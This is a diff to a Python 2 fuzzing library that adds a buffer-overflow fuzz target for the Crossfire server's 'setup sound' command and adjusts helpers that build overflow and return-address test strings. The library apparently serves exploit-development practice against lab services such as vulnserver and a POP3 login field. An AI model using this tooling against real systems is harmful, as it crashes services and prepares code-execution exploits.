@@ -45,6 +45,8 @@ class FuzzBucket(object):
 			self.pop3_password_buffer(evil_buffer)
 		elif self.buffer_to_fuzz == 2:
 			self.test_vulnserv_buffer(evil_buffer)
+		elif self.buffer_to_fuzz == 3:
+			self.crossfire_sound_buffer(evil_buffer)
 
 	def pop3_password_buffer(self, evil_buffer):
 		# sending an evil buffer to the POP3 password field
@@ -61,6 +63,13 @@ class FuzzBucket(object):
 		print "Fuzzing AUTH with {} bytes".format(str(len(evil_buffer)))
 
 		self.socket_conn.send('AUTH ' + evil_buffer + '\r\n')
+		result = self.socket_conn.recv(1024)
+
+	def crossfire_sound_buffer(self, evil_buffer):
+		# sending an evil buffer to the vulnserver process
+		print "Fuzzing setup sound with {} bytes".format(str(len(evil_buffer)))
+
+		self.socket_conn.send('\x11(setup sound ' + evil_buffer + '\x90\x00#')
 		result = self.socket_conn.recv(1024)
 
 class FuzzLib(object):
@@ -81,7 +90,7 @@ class FuzzLib(object):
 	def create_single_buffer(b_size, b_char):
 		string_buffer = b_char*b_size
 
-		return str(string_buffer)
+		return str(string_buffer).decode('string-escape')
 
 	@staticmethod
 	def create_random_buffer(b_size):
@@ -155,7 +164,7 @@ class FuzzLib(object):
 
 	@staticmethod
 	def test_return_address(b_location, return_address):
-		string_buffer = "A" * b_location + return_address + "C" * 400 
+		string_buffer = "A" * b_location + return_address + "C" * 390 
 
 		return str(string_buffer).decode('string-escape')
 
